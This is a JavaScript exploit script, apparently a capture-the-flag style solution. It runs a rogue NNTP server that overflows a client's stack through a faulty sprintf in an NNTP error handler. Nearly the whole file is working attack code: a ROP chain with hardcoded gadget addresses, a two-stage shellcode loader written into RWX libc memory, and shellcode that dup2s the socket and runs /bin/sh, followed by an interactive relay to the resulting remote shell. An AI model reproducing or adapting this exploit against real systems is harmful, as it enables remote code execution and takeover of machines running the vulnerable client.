const net = require("net");
const rl = require("readline");

function helpers(socket) {
	return {
		send: (data) => {
			console.log(">", data);
			socket.write(data, "latin1");
		},
		next: () => {
			return new Promise((resolve) => {
				socket.once("data", (data) => {
					console.log("<", data.toString().replace("\n", ""));
					resolve(data.toString());
				});
			});
		}
	};
}

const server = net.createServer(async (socket) => {
	const { send, next } = helpers(socket);

	// This exploit relies on a faulty sprintf in the NNTP handler.
	// Specifically, there's a call that looks like:
	//
	//     sprintf(stack_buffer, "NNTP Error! News host responded %80s", raw_input_from_server)
	//
	// Using this, we can overwrite the stack with arbitrary contents as long as we don't need to write \x0a or \x00.
	// We can then ROP to write shellcode on top of libc (since it's left as RWX by ld.so), and then jump to our
	// shellcode.
	//
	// We actually do this in two phases: first, we use an inefficient method to write a helpful gadget, and then we
	// use this helpful gadget to write our actual shellcode.  (This is necessary as otherwise our ROP runs off the
	// top of the stack!)

	let pack = (x) => {
		let b = Buffer.from([0,0,0,0]);
		b.writeUInt32LE(x, 0);
		return b.toString("latin1");
	}

	// pop eax
	// mov dword ptr [ebx], eax
	// add ebx, 4
	// ret
	let slowShellcode = "\x58\x89\x03\x83\xC3\x04\xC3";

	// dup2(4, 0) ; 4 is the fd of the already-open connection to our server
	// dup2(4, 1)
	// execve("/bin/sh", 0, 0)
	let fastShellcode = "\x31\xC0\xB0\x3F\x31\xDB\xB3\x04\x31\xC9\xCD\x80\x31\xC0\xB0\x3F\x31\xDB\xB3\x04\x31\xC9\xB1\x01\xCD\x80\x31\xC0\xB0\x0B\xBB\x80\x2A\x01\x60\x31\xC9\x31\xD2\xCD\x80";

	// Some helpful gadgets
	let popEbx = "\xa4\x26\x04\x60";
	let movEcxToEbxOffsetPop = "\x66\x5a\x04\x60";
	let addEcxEax = "\x4a\xeb\x04\x60";
	let incEbx = "\x91\x91\x01\x60";
	let popEaxEcxEdxFd = "\x4b\xe8\x04\x60";
	let writeTargetSlow = 0x5fffffdf;
	let writeTargetFast = 0x5fffffff;
	let ebxOffset = 0x137603a3;
	let padding = "PPPP";
	let bofsize = 488;

	// First: use the ROP-based shellcode loader to load our fast shellcode loader into the RWX memory at 0x5fffffdf

	let data =
		"A".repeat(bofsize)
		+ popEbx
		+ pack(writeTargetSlow + ebxOffset);


	for (let i = 0; i < slowShellcode.length; i++) {
		data +=
			popEaxEcxEdxFd
			+ pack(0x01010101 + slowShellcode.charCodeAt(i))
			+ pack(0xfefefeff)
			+ padding
			+ padding
			+ addEcxEax
			+ movEcxToEbxOffsetPop
			+ padding
			+ incEbx;
	}

	// Second: use the fast shellcode loader to loader our better shellcode into the RWX memory at 0x5fffffff

	data +=
		popEbx
		+ pack(writeTargetFast);

	for (let i = 0; i < fastShellcode.length / 4; i++) {
		data +=
			pack(writeTargetSlow)
			+ fastShellcode.substring(4 * i, 4 * (i + 1)).padEnd(4, "\x01");
	}

	// ret to our shellcode!

	data += pack(writeTargetFast);
	data += "\x00\n";
	send(data);

	// If all went well, we have a shell now!

	rl.createInterface(process.stdin, process.stdout)
		.on("line", (chunk) => send(chunk + "\n"));

	while (true) {
		await next();
	}
});

server.listen(12345);
